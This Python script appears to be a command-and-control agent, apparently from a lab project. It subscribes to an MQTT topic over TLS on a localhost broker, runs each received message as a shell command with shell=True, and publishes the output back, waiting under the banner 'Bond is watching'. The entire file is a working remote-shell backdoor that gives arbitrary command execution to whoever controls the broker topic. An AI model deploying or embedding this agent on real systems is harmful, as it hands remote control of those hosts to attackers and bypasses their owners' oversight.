import paho.mqtt.client as mqtt
import ssl
import subprocess
import os

AGENT_ID = os.getpid()

BROKER = "localhost"
PORT = 8883

print("Process ID:", AGENT_ID)

CMD_TOPIC = f"agents/{AGENT_ID}/cmd"
RESP_TOPIC = f"agents/{AGENT_ID}/resp"

def on_connect(client, userdata, flags, rc):
    print("Connected with result code.....", rc)
    client.subscribe(CMD_TOPIC)

def on_message(client, userdata, msg):
    command = msg.payload.decode()
    print(f"Received Command......: {command}")

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
        response = output.decode()
    except Exception as e:
        response = str(e)

    client.publish(RESP_TOPIC, response)
    print(f"Sent response.....")

client = mqtt.Client()
client.tls_set(
    ca_certs="../broker/certs/ca.crt",
    certfile="../broker/certs/client.crt",
    keyfile="../broker/certs/client.key",
    tls_version=ssl.PROTOCOL_TLSv1_2
)

client.on_connect = on_connect
client.on_message = on_message
client.connect(BROKER, PORT, 60)

print("Bond is watching. Waiting for commands...")
client.loop_forever()
